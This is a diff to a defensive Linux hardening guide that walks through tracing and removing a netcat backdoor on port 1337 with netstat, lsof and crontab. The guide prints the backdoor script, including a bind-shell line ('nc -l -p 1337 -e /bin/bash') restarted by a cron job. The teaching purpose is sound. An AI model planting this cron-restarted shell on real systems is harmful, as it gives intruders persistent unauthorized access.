@@ -66,17 +66,54 @@ Before you try to secure an operating system you will need to remove any malware
 
 In order to find and remove these backdoors from the inside:
 1. Figure out which process is listening on the backdoor port: 
-    * `netstat -antp | grep 1337`
-    * *sample output*
-2. Figure out which files are running the process
-    * `lsof -p <the pid>`
-    * *sample output*
-3. Kill the process:
-    * `pkill -9 <the pid>`
-4. Remove the files
-    * `rm -rf <the file>`
-5. Verify that it's gone:
-    * no more listening `netstat -antp | grep 1337`
+    * `netstat -tulpn | grep 1337`
+    * `tcp    0    0 0.0.0.0:1337    0.0.0.0:*    LISTEN    3652/nc`
+    * in this case 3652 is the process id.
+2. Figure out which files are being used by the process.
+    * `lsof -p 3652` (change the number to match the process id)
+    ```
+    COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
+    nc      3652 rose  cwd    DIR    8,1     4096 2097264 /home/rose
+    nc      3652 rose  rtd    DIR    8,1     4096       2 /
+    nc      3652 rose  txt    REG    8,1    27160  655411 /bin/nc.traditional
+    nc      3652 rose  DEL    REG    8,1          1576273 /lib/x86_64-linux-gnu/libnss_files-2.13.so
+    nc      3652 rose  DEL    REG    8,1          1576266 /lib/x86_64-linux-gnu/libc-2.13.so
+    nc      3652 rose  DEL    REG    8,1          1576264 /lib/x86_64-linux-gnu/ld-2.13.so
+    nc      3652 rose    0u  sock    0,7      0t0    7534 can't identify protocol
+    nc      3652 rose    1u   REG    8,1        0 2490381 /tmp/tmpfhdUXJp (deleted)
+    nc      3652 rose    2u   REG    8,1        0 2490381 /tmp/tmpfhdUXJp (deleted)
+    nc      3652 rose    3u  IPv4   7535      0t0     TCP *:1337 (LISTEN)
+
+    ```
+    * Things to note:
+        * the user for all these commands is rose -- so rose is the one running the backdoor.
+        * some of the files used by the process are the program that it is running. In this case, `/bin/nc` is the actual program. But nc is a basic program. We need to figure out HOW rose is running the program.
+        * Don't just kill the process. You could eliminate the trail to the process. But in this case, it's actually easy -- the process will restart in a minute if we kill it.
+        * Why??? something is restarting the process! Probably a scheduled task. In linux, cron is the way to create scheduled tasks.
+        * Edit rose's crontab:
+            * `crontab -u rose -e`
+            * This line: `* * * * * /usr/sbin/backdoor` tells the scheduler to run the program `/usr/sbin/backdoor` every minute.
+            * remove that line from the crontab.
+            * make sure it's been removed: `crontab -u rose -l`
+        * for fun: explanation of the backdoor:
+            ```
+            It is a script:
+            #!/bin/bash
+            
+            This is the command it uses to check that the script is running:
+            isOn=`netstat -tln | grep ':1337'|wc -l`
+            
+            The if statement checks the result of the isOn command -- if it is zero, then
+            if [ $isOn == "0" ]
+            then
+              It starts a netcat command that enables data sent to the 1337 port to give access to bash (the command line)
+              nc -l -p 1337 -e /bin/bash
+            fi
+            ```
+        * Now remove the backdoor file:
+            * `rm /usr/sbin/backdoor`
+3. Verify that it's gone:
+    * no more listening `netstat -tulpn | grep 1337`
     * files are gone `ls <the file location>`
     * the process is dead `ps x | grep <filename>`
 
